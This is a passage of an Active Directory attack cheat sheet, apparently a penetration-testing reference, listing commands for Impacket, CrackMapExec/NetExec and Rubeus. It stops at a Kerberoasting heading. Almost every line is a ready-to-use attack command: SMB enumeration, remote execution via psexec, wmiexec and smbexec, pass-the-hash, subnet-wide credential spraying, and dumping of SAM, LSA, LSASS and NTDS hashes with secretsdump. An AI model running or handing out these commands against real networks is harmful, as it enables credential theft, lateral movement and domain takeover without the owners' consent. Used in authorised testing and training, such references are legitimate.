1. Impacket Command Reference

Impacket is one of the most important toolkits for Active Directory attacks.

Repo:

https://github.com/fortra/impacket
SMB Enumeration
smbclient.py domain/user:password@target

Anonymous

smbclient.py -no-pass domain/guest@target
Remote Command Execution
PSExec
psexec.py domain/user:password@target

Pass-the-hash

psexec.py domain/user@target -hashes :NTLMHASH
WMIExec
wmiexec.py domain/user:password@target
SMBExec
smbexec.py domain/user:password@target
Secretsdump (Credential Dumping)

Dump domain hashes

secretsdump.py domain/user:password@dc-ip

Pass the hash

secretsdump.py domain/user@dc-ip -hashes :HASH

Dump NTDS

secretsdump.py domain/user:password@dc-ip -just-dc


2. CrackMapExec / NetExec

CrackMapExec (CME) or NetExec is used for credential validation and lateral movement.

SMB login test
crackmapexec smb 10.10.10.0/24 -u user -p password
Pass the hash
crackmapexec smb 10.10.10.0/24 -u administrator -H HASH
Dump SAM
crackmapexec smb target -u user -p password --sam
Dump LSASS
crackmapexec smb target -u user -p password --lsa


3. Rubeus Commands

Rubeus is used for Kerberos attacks.

Repo:

https://github.com/GhostPack/Rubeus
Kerberoasting
